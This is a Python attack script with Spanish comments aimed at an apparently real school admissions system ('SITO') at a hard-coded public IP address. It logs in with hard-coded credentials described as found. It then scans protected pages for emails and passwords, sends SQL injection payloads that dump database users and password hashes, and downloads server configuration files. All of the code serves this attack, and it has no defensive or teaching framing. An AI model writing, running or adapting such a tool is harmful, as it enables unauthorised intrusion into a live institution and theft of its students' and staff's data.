# sito_exploiter.py
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SITOExploiter:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.verify = False
        self.logged_in = False
        
    def login(self, username, password):
        """Inicia sesión en SITO"""
        print(f"[+] Intentando login como {username}:{password}")
        
        # URL de login (basado en tu análisis)
        login_url = f"{self.base_url}/jsp/index.jsp"
        
        # Parámetros del formulario (basado en tu análisis)
        login_data = {
            "yAccion": "login",
            "yUsuario": username,
            "xUsuario": username,
            "xContrasena": password,
            "yIntentos": "1"
        }
        
        try:
            response = self.session.post(login_url, data=login_data)
            
            # Verificar si el login fue exitoso
            if "cerrar_sesion" in response.text or "Solicita Ficha de Admisión" in response.text:
                print("  ✅ Login exitoso!")
                self.logged_in = True
                
                # Guardar cookies de sesión
                if 'JSESSIONID' in self.session.cookies:
                    print(f"  🍪 JSESSIONID: {self.session.cookies['JSESSIONID']}")
                    
                return True
            else:
                print("  ❌ Login fallido")
                return False
                
        except Exception as e:
            print(f"  ❌ Error en login: {e}")
            return False

    def explore_authenticated_area(self):
        """Explora el área autenticada"""
        if not self.logged_in:
            print("❌ No hay sesión activa")
            return
            
        print("\n[+] Explorando área autenticada...")
        
        # Rutas a probar (basado en tu análisis)
        paths = [
            "/jsp/admin/", "/jsp/menu_principal.jsp", "/jsp/escolar/",
            "/jsp/configuracion/", "/jsp/reportes/", "/jsp/database/",
            "/jsp/usuarios/", "/jsp/escolar/proceso_admision/",
            "/jsp/admin/cambiar_password.jsp", "/jsp/admin/crear_usuario.jsp"
        ]
        
        for path in paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"  ✅ {path} - Accesible ({len(response.text)} bytes)")
                    
                    # Buscar información sensible
                    self.search_sensitive_info(response.text, path)
                    
            except Exception as e:
                print(f"  ❌ {path} - Error: {e}")

    def search_sensitive_info(self, content, path):
        """Busca información sensible en el contenido"""
        sensitive_patterns = {
            "emails": r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            "database_connections": r'jdbc:mysql://[^\s"\'<>]+',
            "passwords": r'password[=:]\s*[\'"]?([^\'"\s]+)',
            "config_files": r'\.xml|\.properties|\.config',
            "sql_queries": r'SELECT.*FROM|INSERT INTO|UPDATE.*SET'
        }
        
        for pattern_name, pattern in sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"    🔍 {pattern_name.upper()} encontrado en {path}:")
                for match in matches[:3]:  # Mostrar solo los primeros 3
                    print(f"      • {match}")

    def exploit_sql_injection(self):
        """Explota SQL Injection en endpoints AJAX"""
        print("\n[+] Explotando SQL Injection...")
        
        # Endpoints vulnerables encontrados en tu análisis
        endpoints = [
            "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=",
            "/jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato="
        ]
        
        # Payloads de SQL Injection
        payloads = [
            "1' UNION SELECT user(),database(),version()--",
            "1' UNION SELECT table_name,table_schema,3 FROM information_schema.tables--",
            "1' UNION SELECT @@version,@@hostname,@@datadir--",
            "1' UNION SELECT user,password,host FROM mysql.user--"
        ]
        
        for endpoint in endpoints:
            print(f"\n  🔍 Probando endpoint: {endpoint}")
            
            for payload in payloads:
                try:
                    url = f"{self.base_url}{endpoint}{payload}"
                    response = self.session.get(url)
                    
                    if response.status_code == 200 and len(response.text) > 10:
                        print(f"    ✅ Payload exitoso: {payload}")
                        print(f"      Respuesta: {response.text[:200]}...")
                        
                        # Guardar respuesta interesante
                        filename = f"sql_result_{hash(payload)}.txt"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"      📁 Guardado como: {filename}")
                        
                except Exception as e:
                    print(f"    ❌ Error con payload {payload}: {e}")

    def download_config_files(self):
        """Intenta descargar archivos de configuración"""
        print("\n[+] Intentando descargar archivos de configuración...")
        
        config_files = [
            "/WEB-INF/web.xml", "/META-INF/context.xml", 
            "/config.properties", "/database.properties",
            "/jsp/configuracion/database_config.jsp"
        ]
        
        for config_file in config_files:
            try:
                url = f"{self.base_url}{config_file}"
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"  ✅ Archivo encontrado: {config_file}")
                    
                    filename = f"config_{config_file.replace('/', '_')}"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print(f"    📁 Guardado como: {filename}")
                    
            except Exception as e:
                print(f"  ❌ Error con {config_file}: {e}")

    def run_exploitation(self, username, password):
        """Ejecuta la explotación completa"""
        print("=== EXPLOTACIÓN SITO ===")
        
        # 1. Login
        if self.login(username, password):
            # 2. Explorar área autenticada
            self.explore_authenticated_area()
            
            # 3. Explotar SQL Injection
            self.exploit_sql_injection()
            
            # 4. Descargar configuraciones
            self.download_config_files()
            
            print("\n✅ Explotación completada!")
        else:
            print("❌ No se pudo iniciar sesión")

# Uso del explotador
if __name__ == "__main__":
    # Usar las credenciales que encontraste
    exploiter = SITOExploiter("https://189.254.143.102")
    exploiter.run_exploitation("hnieto", "utslp")